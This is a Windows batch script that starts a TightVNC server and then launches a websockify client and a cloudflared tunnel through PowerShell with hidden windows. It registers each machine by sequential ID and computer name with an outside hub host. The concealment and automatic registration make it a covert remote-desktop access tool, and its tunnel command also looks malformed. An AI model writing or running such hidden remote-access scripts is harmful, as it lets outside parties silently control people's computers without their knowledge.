@echo off
:: -------------------------------
:: Windows VNC Client Connector – sequential ID
:: -------------------------------

set "NO_VNC_DIR=C:\ProgramData\server\noVnc"
set "HUB_URL=vnc.qikseek.qzz.io"
set "ID_FILE=%NO_VNC_DIR%\last_id.txt"

:: Determine next sequential ID
if exist "%ID_FILE%" (
    set /p LAST_ID=<%ID_FILE%
    set /a REPEATER_ID=LAST_ID+1
) else (
    set REPEATER_ID=1
)

echo %REPEATER_ID% > "%ID_FILE%"
echo Connecting with repeater ID: %REPEATER_ID%

:: Start TightVNC hidden
start "" "C:\Program Files\TightVNC\tvnserver.exe"
timeout /t 5 /nobreak >nul

:: Run websockify client hidden
powershell -WindowStyle Hidden -Command ^
  "Start-Process node -ArgumentList 'config.js --repeater=%REPEATER_ID%' -WorkingDirectory '%NO_VNC_DIR%' -WindowStyle Hidden"

timeout /t 5 /nobreak >nul

:: Connect to hub automatically with correct sequential ID
powershell -WindowStyle Hidden -Command ^
  "Start-Process cloudflared -ArgumentList 'tunnel --url http://%HUB_URL%:8080?repeater=%REPEATER_ID%&name=%COMPUTERNAME% --no-autoupdate' -WindowStyle Hidden"